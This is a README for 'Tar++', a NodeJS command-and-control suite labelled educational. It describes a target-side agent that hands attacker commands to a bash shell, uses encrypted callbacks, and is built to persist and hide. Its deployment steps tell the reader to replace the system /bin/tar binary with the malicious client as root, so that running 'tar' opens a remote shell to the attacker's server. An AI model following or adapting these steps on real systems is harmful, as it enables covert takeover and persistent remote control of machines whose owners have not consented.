# Tar++; Command and Control Suite
By Thomas Williams

## Purpose
This project aims to provide a command and control client for educational
purposes satisfying the following goals:
1. Provide remote code execution
2. Persist across reboots
3. Easy configuration
4. Authenticate communication
5. Hide the vulnerability

## Plan
This codebase will consist of 2 main parts:
1. An agent which runs on the target machine to accept and execute commands
2. An attacker server which sends commands to clients

## Node
For simplicity in web communication, this project will be NodeJS based.
Webpack will be used to transpile the client into a single file which
can be easily installed.

## Prerequisites
This suite requires `node` and `npm` on the server, and requires `node` to be
installed on the target system. 

To install server dependencies on Kali linux (and other `apt` distros), run
```
sudo apt install nodejs npm
```

To install client/target dependencies (on CentOS), run as root:
```
yum install -y nodejs
```

## Configuration
To begin configuration, run the `build.sh` script. This will create
`config.json` which then can be modified to contain the server IP
and port information. This build script will also create public
and private keys which will be used in the compilation process.

## Building
To build the server and client after configuration, run
```
npm run build
```
This populates the `./build` directory with client and server files.

## Starting the Server
The server can be run with
```
node ./build/server.js
```
The server will listen for incoming client requests, and upon a connection,
sends all input to a bash shell on the client.

## Deploying the Client
Copy the `client.js` file to the target machine, and with the `client.js`
file in the current directory, run as root:
```
cp -f /bin/tar /bin/tar2
cp client.js /bin/tar
```

To immediately start a connection to the server, run (as root or user)
```
tar
```

## Authentication and Encryption
The connection between client is secured by both assymetric and symmetric 
cryptography. When clients first connect to the server, they encrypt a 
new symmetric key with the server's public key. All future communication
is done using the symmetric key. Without the symmetric key, an outsider
cannot interpret or create new messages. Without the server's private key,
an outsider cannot decrypt and acquire the symmetric key. Therefore the 
client-server connection is reasonably secure against outsider adversaries.
